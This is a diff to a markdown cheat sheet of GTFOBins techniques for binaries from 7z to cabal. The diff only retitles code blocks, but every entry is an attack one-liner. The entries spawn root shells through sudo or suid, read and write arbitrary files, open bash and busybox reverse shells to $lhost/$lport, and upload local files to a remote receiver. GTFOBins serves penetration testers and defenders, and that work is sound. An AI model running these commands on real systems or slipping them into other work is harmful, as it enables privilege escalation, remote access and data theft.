@@ -8,7 +8,7 @@ Reference for [GTFOBins](https://gtfobins.github.io/) techniques. Each entry sho
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins 7z file-read (sudo / unprivileged)"
 7z a -ttar -an -so $file_in | 7z e -ttar -si -so
 ```
 <!-- cheat
@@ -21,7 +21,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins R shell (sudo / suid / unprivileged)"
 R --no-save -e 'system("/bin/sh")'
 ```
 <!-- cheat
@@ -33,7 +33,7 @@ R --no-save -e 'system("/bin/sh")'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins aa-exec shell (sudo / suid / unprivileged)"
 aa-exec /bin/sh
 ```
 <!-- cheat
@@ -45,7 +45,7 @@ aa-exec /bin/sh
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ab download (sudo / suid / unprivileged)"
 ab -v2 $scheme://$lhost$file_in
 ```
 <!-- cheat
@@ -58,7 +58,7 @@ var file_in
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ab upload (sudo / suid / unprivileged)"
 ab -p $file_in $scheme://$lhost/
 ```
 <!-- cheat
@@ -73,7 +73,7 @@ var file_in
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins acr command (sudo / suid / unprivileged)"
 echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >$tmp_file
 chmod +x $tmp_file
 acr -r $tmp_file
@@ -88,7 +88,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"suid"
+```sh title:"GTFOBins agetty shell (suid)"
 agetty -l /bin/sh -o -p -a root tty
 ```
 <!-- cheat
@@ -100,7 +100,7 @@ agetty -l /bin/sh -o -p -a root tty
 
 The file is displayed in the terminal interface. Other options might be available, for example, by pressing `S` is possible to save the file content elsewhere.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins alpine file-read (sudo / suid / unprivileged)"
 alpine -F $file_in
 ```
 <!-- cheat
@@ -113,7 +113,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ansible-playbook shell (sudo / unprivileged)"
 echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$tmp_file
 ansible-playbook $tmp_file
 ```
@@ -127,7 +127,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ansible-test shell (sudo / unprivileged)"
 ansible-test shell
 ```
 <!-- cheat
@@ -139,7 +139,7 @@ ansible-test shell
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins aoss shell (sudo / unprivileged)"
 aoss /bin/sh
 ```
 <!-- cheat
@@ -151,7 +151,7 @@ aoss /bin/sh
 
 The first line may be leaked as an error message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins apache2 file-read #1 (sudo / suid / unprivileged)"
 apache2 -f $file_in
 ```
 <!-- cheat
@@ -162,7 +162,7 @@ var file_in
 
 The first line may be leaked as an error message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins apache2 file-read #2 (sudo / suid / unprivileged)"
 apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include $file_in'
 ```
 <!-- cheat
@@ -175,7 +175,7 @@ var file_in
 
 The first line only is likely leaked as an error message.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins apache2ctl file-read (sudo / unprivileged)"
 apache2ctl -c 'Include $file_in'
 ```
 <!-- cheat
@@ -188,7 +188,7 @@ var file_in
 
 The terminal interface expects some choices in order to spawn tha pager.
 
-```sh title:"unprivileged"
+```sh title:"GTFOBins apport-cli inherit (inherits from less) (unprivileged)"
 apport-cli -f
 1
 2
@@ -207,7 +207,7 @@ Alias of [apt-get](#apt_get). All techniques from `apt-get` apply.
 
 For this to work the target package (i.e., `sl`) must not be already installed.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins apt-get shell #1 (sudo / suid)"
 echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >$tmp_file
 apt-get -y install -c $tmp_file sl
 ```
@@ -219,7 +219,7 @@ var tmp_file
 
 When the shell exits the `update` command is actually executed.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins apt-get shell #2 (sudo / suid)"
 apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 ```
 <!-- cheat
@@ -229,7 +229,7 @@ apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins apt-get inherit (inherits from less) (sudo / unprivileged)"
 apt-get changelog apt
 ```
 <!-- cheat
@@ -241,7 +241,7 @@ apt-get changelog apt
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins aptitude inherit (inherits from less) (sudo / unprivileged)"
 aptitude changelog aptitude
 ```
 <!-- cheat
@@ -253,7 +253,7 @@ aptitude changelog aptitude
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ar file-read (sudo / suid / unprivileged)"
 ar r $file_out $file_in
 ar p $file_out
 ```
@@ -268,7 +268,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins arch-nspawn shell (sudo)"
 mkdir -p ./etc/
 grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
 touch ./etc/pacman.conf
@@ -284,7 +284,7 @@ arch-nspawn .
 
 Note that the subprocess is immediately sent to the background.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins aria2c command #1 (sudo / suid / unprivileged)"
 echo $cmd_file >$tmp_file
 chmod +x $tmp_file
 aria2c --on-download-error=$tmp_file http://some-invalid-domain
@@ -298,7 +298,7 @@ var tmp_file
 
 The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `$cmd_file`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins aria2c command #2 (sudo / suid / unprivileged)"
 aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh $scheme://$lhost/aaaaaaaaaaaaaaaa
 ```
 <!-- cheat
@@ -310,7 +310,7 @@ import scheme
 
 The file is leaked as error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins aria2c file-read (sudo / suid / unprivileged)"
 aria2c -i $file_in
 ```
 <!-- cheat
@@ -321,7 +321,7 @@ var file_in
 
 Use `--allow-overwrite` if needed. Similarly `-o $file_out` can be omitted, in that case the file is saved to `input-file` in the current working directory.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins aria2c download (sudo / suid / unprivileged)"
 aria2c -o $file_out $scheme://$lhost$file_in
 ```
 <!-- cheat
@@ -337,7 +337,7 @@ var file_out
 
 The `.arj` suffix will be added to `output-file`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins arj file-read (sudo / suid / unprivileged)"
 arj a $file_out $file_in
 arj p $file_out
 ```
@@ -350,7 +350,7 @@ var file_out
 
 The `.arj` suffix will be added to `x`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins arj file-write (sudo / suid / unprivileged)"
 echo $data >output-file
 arj a x output-file
 arj e x $dir_out/
@@ -366,7 +366,7 @@ var dir_out
 
 Lines are likely leaked as error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins arp file-read (sudo / suid / unprivileged)"
 arp -v -f $file_in
 ```
 <!-- cheat
@@ -379,7 +379,7 @@ var file_in
 
 Lines are likely leaked as error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins as file-read (sudo / suid / unprivileged)"
 as @$file_in
 ```
 <!-- cheat
@@ -392,7 +392,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ascii-xfr file-read (sudo / suid / unprivileged)"
 ascii-xfr -ns $file_in
 ```
 <!-- cheat
@@ -405,7 +405,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ascii85 file-read (sudo / unprivileged)"
 ascii85 $file_in | ascii85 --decode
 ```
 <!-- cheat
@@ -418,7 +418,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ash shell (sudo / suid / unprivileged)"
 ash
 ```
 <!-- cheat
@@ -426,7 +426,9 @@ ash
 
 #### ash shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins ash shell - suid override (suid variant)"
 ash -p
 ```
 <!-- cheat
@@ -436,7 +438,7 @@ ash -p
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ash file-write (sudo / suid / unprivileged)"
 ash -c 'echo $data >$file_out'
 ```
 <!-- cheat
@@ -446,7 +448,9 @@ var file_out
 
 #### ash file-write - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins ash file-write - suid override (suid variant)"
 ash -p -c 'echo $data >$file_out'
 ```
 <!-- cheat
@@ -460,7 +464,7 @@ var file_out
 
 The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins aspell file-read #1 (sudo / suid / unprivileged)"
 aspell -c $file_in
 ```
 <!-- cheat
@@ -471,7 +475,7 @@ var file_in
 
 The first word is likely displayed as error messaged, and converted to lowercase.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins aspell file-read #2 (sudo / suid / unprivileged)"
 aspell --conf $file_in
 ```
 <!-- cheat
@@ -484,7 +488,7 @@ var file_in
 
 A server instance must be already running, otherwise it can be started with `sudo asterisk -F`. Moreover, the invoking user must be able to access the socket.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins asterisk shell (sudo / suid / unprivileged)"
 asterisk -r
 !/bin/sh
 ```
@@ -497,7 +501,7 @@ asterisk -r
 
 `tail` is used to pause the terminal.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins at shell (sudo / unprivileged)"
 echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
 ```
 <!-- cheat
@@ -507,7 +511,7 @@ echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins at command (sudo / unprivileged)"
 echo $cmd_file | at now
 ```
 <!-- cheat
@@ -520,7 +524,7 @@ var cmd_file
 
 Outputs only the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`. Content can be retrieved with `awk -F "'" '{printf "%s", $2}'`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins atobm file-read (sudo / suid / unprivileged)"
 atobm $file_in
 ```
 <!-- cheat
@@ -533,7 +537,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins autoconf shell (sudo / unprivileged)"
 echo /bin/sh >$tmp_file
 chmod +x $tmp_file
 touch configure.ac
@@ -549,7 +553,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins autoheader shell (sudo / unprivileged)"
 echo '/bin/sh 1>&0' >$tmp_file
 chmod +x $tmp_file
 touch configure.ac
@@ -565,7 +569,7 @@ var tmp_file
 
 The shell is invoked multiple times.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins autoreconf shell (sudo / unprivileged)"
 echo '/bin/sh 1>&0' >$tmp_file
 chmod +x $tmp_file
 echo AC_INIT >configure.ac
@@ -585,7 +589,7 @@ Alias of [mawk](#mawk). All techniques from `mawk` apply.
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins aws file-read (sudo / suid / unprivileged)"
 aws ec2 describe-instances --filter file://$file_in
 ```
 <!-- cheat
@@ -596,7 +600,7 @@ var file_in
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins aws inherit (inherits from less) (sudo / unprivileged)"
 aws help
 ```
 <!-- cheat
@@ -608,7 +612,7 @@ aws help
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins base32 file-read (sudo / suid / unprivileged)"
 base32 $file_in | base32 --decode
 ```
 <!-- cheat
@@ -621,7 +625,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins base58 file-read (sudo / unprivileged)"
 base58 $file_in | base58 --decode
 ```
 <!-- cheat
@@ -634,7 +638,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins base64 file-read (sudo / suid / unprivileged)"
 base64 $file_in | base64 --decode
 ```
 <!-- cheat
@@ -647,7 +651,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins basenc file-read (sudo / suid / unprivileged)"
 basenc --base64 $file_in | basenc -d --base64
 ```
 <!-- cheat
@@ -660,7 +664,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins basez file-read (sudo / suid / unprivileged)"
 basez $file_in | basez --decode
 ```
 <!-- cheat
@@ -673,7 +677,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bash shell (sudo / suid / unprivileged)"
 bash
 ```
 <!-- cheat
@@ -681,7 +685,9 @@ bash
 
 #### bash shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins bash shell - suid override (suid variant)"
 bash -p
 ```
 <!-- cheat
@@ -691,7 +697,7 @@ bash -p
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bash reverse-shell (sudo / suid / unprivileged)"
 bash -c 'exec bash -i &>/dev/tcp/$lhost/$lport <&1'
 ```
 <!-- cheat
@@ -701,7 +707,9 @@ import lports
 
 #### bash reverse-shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins bash reverse-shell - suid override (suid variant)"
 bash -p -c 'exec bash -p -i &>/dev/tcp/$lhost/$lport <&1'
 ```
 <!-- cheat
@@ -713,7 +721,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bash file-read #1 (sudo / suid / unprivileged)"
 bash -c 'echo "$(<$file_in)"'
 ```
 <!-- cheat
@@ -722,7 +730,9 @@ var file_in
 
 #### bash file-read #1 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins bash file-read #1 - suid override (suid variant)"
 bash -p -c 'echo "$(<$file_in)"'
 ```
 <!-- cheat
@@ -733,7 +743,7 @@ var file_in
 
 This only works interactively from an existing `bash` session.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bash file-read #2 (sudo / suid / unprivileged)"
 HISTTIMEFORMAT=$'\r\e[K'
 history -c
 history -r $file_in
@@ -747,7 +757,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bash file-write #1 (sudo / suid / unprivileged)"
 bash -c 'echo $data >$file_out'
 ```
 <!-- cheat
@@ -757,7 +767,9 @@ var file_out
 
 #### bash file-write #1 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins bash file-write #1 - suid override (suid variant)"
 bash -p -c 'echo $data >$file_out'
 ```
 <!-- cheat
@@ -769,7 +781,7 @@ var file_out
 
 This only works interactively from an existing `bash` session. It adds timestamps to the output file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bash file-write #2 (sudo / suid / unprivileged)"
 HISTIGNORE='history *'
 history -c
 $data
@@ -784,7 +796,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bash download #1 (sudo / suid / unprivileged)"
 bash -c '{ echo -ne "GET $file_in HTTP/1.0\r\nhost: $lhost\r\n\r\n" 1>&3; cat 0<&3; } \
     3<>/dev/tcp/$lhost/$lport \
     | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >$file_out'
@@ -798,7 +810,9 @@ var file_out
 
 #### bash download #1 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins bash download #1 - suid override (suid variant)"
 bash -p -c '{ echo -ne "GET $file_in HTTP/1.0\r\nhost: $lhost\r\n\r\n" 1>&3; cat 0<&3; } \
     3<>/dev/tcp/$lhost/$lport \
     | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >$file_out'
@@ -814,7 +828,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bash download #2 (sudo / suid / unprivileged)"
 bash -c 'echo "$(</dev/tcp/$lhost/$lport) >$file_out'
 ```
 <!-- cheat
@@ -825,7 +839,9 @@ var file_out
 
 #### bash download #2 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins bash download #2 - suid override (suid variant)"
 bash -p -c 'echo "$(</dev/tcp/$lhost/$lport) >$file_out'
 ```
 <!-- cheat
@@ -838,7 +854,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bash upload #1 (sudo / suid / unprivileged)"
 bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$file_in)" >/dev/tcp/$lhost/$lport'
 ```
 <!-- cheat
@@ -849,7 +865,9 @@ var file_in
 
 #### bash upload #1 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins bash upload #1 - suid override (suid variant)"
 bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(<$file_in)" >/dev/tcp/$lhost/$lport'
 ```
 <!-- cheat
@@ -862,7 +880,7 @@ var file_in
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bash upload #2 (sudo / suid / unprivileged)"
 bash -c 'echo -n "$(<$file_in)" >/dev/tcp/$lhost/$lport'
 ```
 <!-- cheat
@@ -873,7 +891,9 @@ var file_in
 
 #### bash upload #2 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins bash upload #2 - suid override (suid variant)"
 bash -p -c 'echo -n "$(<$file_in)" >/dev/tcp/$lhost/$lport'
 ```
 <!-- cheat
@@ -886,7 +906,7 @@ var file_in
 
 Load an attacker-supplied shared library.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bash library-load (sudo / suid / unprivileged)"
 bash -c 'enable -f $lib x'
 ```
 <!-- cheat
@@ -895,7 +915,9 @@ var lib
 
 #### bash library-load - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins bash library-load - suid override (suid variant)"
 bash -p -c 'enable -f $lib x'
 ```
 <!-- cheat
@@ -908,7 +930,7 @@ var lib
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins bashbug inherit (inherits from vi) (sudo / unprivileged)"
 bashbug
 ```
 <!-- cheat
@@ -920,7 +942,7 @@ bashbug
 
 `--paging always` can be omitted provided that the output doesn't fit the screen.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins batcat inherit (inherits from less) (sudo / suid / unprivileged)"
 batcat --paging always /etc/hosts
 ```
 <!-- cheat
@@ -932,7 +954,7 @@ batcat --paging always /etc/hosts
 
 The file is displayed in the debug log.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins bbot file-read (sudo / unprivileged)"
 bbot -d -cy $file_in
 ```
 <!-- cheat
@@ -945,7 +967,7 @@ var file_in
 
 The file content is actually parsed and appears as error messages.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bc file-read (sudo / suid / unprivileged)"
 bc -s $file_in
 quit
 ```
@@ -959,7 +981,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins bconsole shell (sudo / unprivileged)"
 bconsole
 @exec /bin/sh
 ```
@@ -970,7 +992,7 @@ bconsole
 
 The file is actually parsed and the first wrong line is returned in an error message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bconsole file-read (sudo / suid / unprivileged)"
 bconsole -c $file_in
 ```
 <!-- cheat
@@ -983,7 +1005,7 @@ var file_in
 
 This allows to run PHP code (`...`).  This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bee inherit (inherits from php) (sudo / suid / unprivileged)"
 bee eval '...'
 ```
 <!-- cheat
@@ -995,7 +1017,7 @@ bee eval '...'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins borg shell (sudo / unprivileged)"
 borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
 ```
 <!-- cheat
@@ -1007,7 +1029,7 @@ borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins bpftrace shell #1 (sudo)"
 bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
 ```
 <!-- cheat
@@ -1017,7 +1039,7 @@ bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins bpftrace shell #2 (sudo)"
 echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >$tmp_file
 bpftrace --unsafe $tmp_file
 ```
@@ -1029,7 +1051,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins bpftrace shell #3 (sudo)"
 bpftrace -c /bin/sh -e 'END {exit()}'
 ```
 <!-- cheat
@@ -1041,7 +1063,7 @@ bpftrace -c /bin/sh -e 'END {exit()}'
 
 Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bridge file-read (sudo / suid / unprivileged)"
 bridge -b $file_in
 ```
 <!-- cheat
@@ -1054,7 +1076,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins bundle shell #1 (sudo / unprivileged)"
 BUNDLE_GEMFILE=x bundle exec /bin/sh
 ```
 <!-- cheat
@@ -1064,7 +1086,7 @@ BUNDLE_GEMFILE=x bundle exec /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins bundle shell #2 (sudo / unprivileged)"
 touch Gemfile
 bundle exec /bin/sh
 ```
@@ -1075,7 +1097,7 @@ bundle exec /bin/sh
 
 This might run the shell twice, one after the other.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins bundle shell #3 (sudo / unprivileged)"
 echo 'system("/bin/sh")' >Gemfile
 bundle install
 ```
@@ -1086,7 +1108,7 @@ bundle install
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins bundle inherit #1 (inherits from less) (sudo / unprivileged)"
 bundle help
 ```
 <!-- cheat
@@ -1096,7 +1118,7 @@ bundle help
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins bundle inherit #2 (inherits from irb) (sudo / unprivileged)"
 touch Gemfile
 bundle console
 ```
@@ -1113,7 +1135,7 @@ Alias of [bundle](#bundle). All techniques from `bundle` apply.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins busctl shell #1 (sudo / suid / unprivileged)"
 busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
 ```
 <!-- cheat
@@ -1121,7 +1143,9 @@ busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freed
 
 #### busctl shell #1 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins busctl shell #1 - suid override (suid variant)"
 busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
 ```
 <!-- cheat
@@ -1131,7 +1155,7 @@ busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freed
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins busctl shell #2 (sudo / suid / unprivileged)"
 busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
 ```
 <!-- cheat
@@ -1139,7 +1163,9 @@ busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
 
 #### busctl shell #2 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins busctl shell #2 - suid override (suid variant)"
 busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
 ```
 <!-- cheat
@@ -1149,7 +1175,7 @@ busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins busctl inherit (inherits from less) (sudo / suid / unprivileged)"
 busctl --show-machine
 ```
 <!-- cheat
@@ -1163,7 +1189,7 @@ BusyBox may contain many utilities, run `busybox --list-full` to check what othe
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins busybox reverse-shell (sudo / unprivileged)"
 busybox nc -e /bin/sh $lhost $lport
 ```
 <!-- cheat
@@ -1175,7 +1201,7 @@ import lports
 
 This serves files in the local folder via an HTTP server.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins busybox upload (sudo / unprivileged)"
 busybox httpd -f -p $lport -h .
 ```
 <!-- cheat
@@ -1186,7 +1212,7 @@ import lports
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins busybox inherit #1 (inherits from ash) (sudo / unprivileged)"
 busybox ash
 ```
 <!-- cheat
@@ -1196,7 +1222,7 @@ busybox ash
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins busybox inherit #2 (inherits from cat) (sudo / unprivileged)"
 busybox cat
 ```
 <!-- cheat
@@ -1208,7 +1234,7 @@ busybox cat
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins byebug inherit (inherits from ruby) (sudo / unprivileged)"
 byebug --no-stop $script
 ```
 <!-- cheat
@@ -1223,7 +1249,7 @@ There are also a number of other utilities that rely on `bzip2` under the hood, 
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins bzip2 file-read (sudo / suid / unprivileged)"
 bzip2 -c $file_in | bzip2 -d
 ```
 <!-- cheat
@@ -1244,7 +1270,7 @@ Alias of [gcc](#gcc). All techniques from `gcc` apply.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cabal shell (sudo / suid / unprivileged)"
 cabal exec --project-file=/dev/null -- /bin/sh
 ```
 <!-- cheat
@@ -1252,7 +1278,9 @@ cabal exec --project-file=/dev/null -- /bin/sh
 
 #### cabal shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins cabal shell - suid override (suid variant)"
 cabal exec --project-file=/dev/null -- /bin/sh -p
 ```
 <!-- cheat
